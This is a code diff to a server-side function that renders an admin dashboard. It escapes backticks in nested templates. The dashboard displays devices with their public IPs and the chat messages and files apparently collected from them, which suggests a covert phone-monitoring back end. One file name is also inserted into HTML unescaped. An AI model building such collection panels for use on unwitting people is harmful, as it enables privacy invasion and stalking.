@@ -287,12 +287,11 @@ async function devicesWithStats() {
 }
 
 // ============================================
-// ADVANCED DASHBOARD HTML
+// ADVANCED DASHBOARD HTML (with escaped backticks)
 // ============================================
 
 async function renderDashboard() {
-    // We use a template literal; ensure no stray backticks inside.
-    return `<!DOCTYPE html>
+    const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
@@ -450,18 +449,18 @@ function renderDevices() {
   document.getElementById('totalDevices').textContent = state.devices.length;
   document.getElementById('onlineDevices').textContent = state.devices.filter(d=>d.online).length;
   document.getElementById('totalFiles').textContent = state.devices.reduce((a,d)=>a+(d.file_count||0),0);
-  document.getElementById('deviceList').innerHTML = list.map(d => `
-    <div class="device-item ${d.device_id===state.selected?'active':''}" data-id="${esc(d.device_id)}">
+  document.getElementById('deviceList').innerHTML = list.map(d => \`
+    <div class="device-item \${d.device_id===state.selected?'active':''}" data-id="\${esc(d.device_id)}">
       <div class="device-left">
-        <span class="dot ${d.online?'online':'offline'}"></span>
-        <span class="device-name">${esc(d.display_name||d.device_id)}</span>
+        <span class="dot \${d.online?'online':'offline'}"></span>
+        <span class="device-name">\${esc(d.display_name||d.device_id)}</span>
       </div>
       <div class="device-right">
-        <span class="badge">💬 ${d.message_count||0}</span>
-        <span class="badge">📁 ${d.file_count||0}</span>
+        <span class="badge">💬 \${d.message_count||0}</span>
+        <span class="badge">📁 \${d.file_count||0}</span>
       </div>
     </div>
-  `).join('') || '<div class="empty-state">No devices found</div>';
+  \`).join('') || '<div class="empty-state">No devices found</div>';
 }
 
 function renderMain(device) {
@@ -482,49 +481,49 @@ function renderEmpty() {
 }
 
 function renderInfo(device) {
-  document.getElementById('tabInfo').innerHTML = `
+  document.getElementById('tabInfo').innerHTML = \`
     <div class="info-grid">
-      ${['device_id','my_uid','public_id','my_name','brand','model','battery_percent','network_type','public_ip','server_last_seen','created_at'].map(k => `
-        <div><div class="label">${esc(k)}</div><div class="value">${esc(device[k]??'-')}</div></div>
-      `).join('')}
+      \${['device_id','my_uid','public_id','my_name','brand','model','battery_percent','network_type','public_ip','server_last_seen','created_at'].map(k => \`
+        <div><div class="label">\${esc(k)}</div><div class="value">\${esc(device[k]??'-')}</div></div>
+      \`).join('')}
     </div>
-  `;
+  \`;
 }
 
 function renderChats() {
-  document.getElementById('tabChats').innerHTML = state.messages.length ? `
+  document.getElementById('tabChats').innerHTML = state.messages.length ? \`
     <div class="chat-list">
-      ${state.messages.map(m => `
+      \${state.messages.map(m => \`
         <div class="chat-item">
-          <div><span class="peer">${esc(m.peer_name||'Unknown')}</span> <span class="direction ${m.direction==='out'?'out':'in'}">${esc(m.direction||'')}</span></div>
-          <div class="text">${esc(m.text||'')}</div>
-          <div class="time">${fmtDate(m.message_time||m.received_at)}</div>
+          <div><span class="peer">\${esc(m.peer_name||'Unknown')}</span> <span class="direction \${m.direction==='out'?'out':'in'}">\${esc(m.direction||'')}</span></div>
+          <div class="text">\${esc(m.text||'')}</div>
+          <div class="time">\${fmtDate(m.message_time||m.received_at)}</div>
         </div>
-      `).join('')}
+      \`).join('')}
     </div>
-  ` : '<div class="empty-state">No messages for this device</div>';
+  \` : '<div class="empty-state">No messages for this device</div>';
 }
 
 function renderFiles() {
-  document.getElementById('tabFiles').innerHTML = state.files.length ? `
+  document.getElementById('tabFiles').innerHTML = state.files.length ? \`
     <div class="file-grid">
-      ${state.files.map(f => {
+      \${state.files.map(f => {
         const url = '/uploads/'+encodeURIComponent(f.file);
-        const thumb = isImg(f.file) ? `<img src="${url}" alt="${esc(f.original)}" loading="lazy">` :
-                      isVid(f.file) ? `<video src="${url}" muted></video>` :
-                      `<span>📄</span>`;
-        return `
-          <div class="file-card" data-file="${esc(f.file)}" onclick="openPreview('${esc(f.file)}')">
-            <div class="thumb">${thumb}</div>
+        const thumb = isImg(f.file) ? \`<img src="\${url}" alt="\${esc(f.original)}" loading="lazy">\` :
+                      isVid(f.file) ? \`<video src="\${url}" muted></video>\` :
+                      \`<span>📄</span>\`;
+        return \`
+          <div class="file-card" data-file="\${esc(f.file)}" onclick="openPreview('\${esc(f.file)}')">
+            <div class="thumb">\${thumb}</div>
             <div class="info">
-              <div class="name" title="${esc(f.original||f.file)}">${esc(f.original||f.file)}</div>
-              <div class="meta"><span>${fmtSize(f.size)}</span><span>${fmtDate(f.time)}</span></div>
+              <div class="name" title="\${esc(f.original||f.file)}">\${esc(f.original||f.file)}</div>
+              <div class="meta"><span>\${fmtSize(f.size)}</span><span>\${fmtDate(f.time)}</span></div>
             </div>
           </div>
-        `;
+        \`;
       }).join('')}
     </div>
-  ` : '<div class="empty-state">No files for this device</div>';
+  \` : '<div class="empty-state">No files for this device</div>';
 }
 
 function switchTab(tab) {
@@ -538,15 +537,15 @@ function openPreview(file) {
   const modal = document.getElementById('fileModal');
   const body = document.getElementById('modalBody');
   const actions = document.getElementById('modalActions');
-  if (isImg(file)) body.innerHTML = `<img src="${url}" alt="${file}">`;
-  else if (isVid(file)) body.innerHTML = `<video src="${url}" controls autoplay></video>`;
-  else body.innerHTML = `<div style="padding:40px;font-size:48px;text-align:center">📄</div><div style="text-align:center">${esc(file)}</div>`;
-  actions.innerHTML = `
-    <a href="${url}" target="_blank">Open</a>
-    <a href="${url}" download>Download</a>
-    <button class="delete" onclick="deleteFile('${esc(file)}')">Delete</button>
+  if (isImg(file)) body.innerHTML = \`<img src="\${url}" alt="\${file}">\`;
+  else if (isVid(file)) body.innerHTML = \`<video src="\${url}" controls autoplay></video>\`;
+  else body.innerHTML = \`<div style="padding:40px;font-size:48px;text-align:center">📄</div><div style="text-align:center">\${esc(file)}</div>\`;
+  actions.innerHTML = \`
+    <a href="\${url}" target="_blank">Open</a>
+    <a href="\${url}" download>Download</a>
+    <button class="delete" onclick="deleteFile('\${esc(file)}')">Delete</button>
     <button onclick="closeModal()">Close</button>
-  `;
+  \`;
   modal.classList.add('show');
 }
 
@@ -584,6 +583,8 @@ load();
 </script>
 </body>
 </html>`;
+
+    return html;
 }
 
 // ============================================
